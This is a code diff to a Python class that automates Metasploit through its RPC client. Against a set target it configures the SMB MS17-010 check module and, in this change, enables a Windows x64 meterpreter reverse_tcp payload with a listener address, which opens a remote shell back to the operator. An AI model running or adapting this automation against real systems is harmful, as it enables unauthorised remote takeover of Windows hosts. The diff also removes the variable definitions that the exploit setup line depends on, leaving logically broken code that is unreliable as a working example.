@@ -75,9 +75,6 @@ class MetasploitInterface:
         client = self.connectMetasploit()
         split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
 
-        module = split_string[0]
-        specific_module = "/".join(split_string[1:])
-
         """ SETS UP EXPLOIT and TARGET"""
         exploit = client.modules.use(module, specific_module)
         module = split_string[0]
@@ -107,10 +104,8 @@ class MetasploitInterface:
         exploit["RHOSTS"] = self.target
         exploit["CheckModule"] = 'auxiliary/scanner/smb/smb_ms17_010'
         print(exploit.missing_required)
-        # payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-
-
-        # exploit["LHOST"] = LHOSTIP
+        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+        payload['LHOST'] = LHOSTIP
 
         cid = client.consoles.console().cid
         print(client.consoles.console(cid).run_module_with_output(exploit))
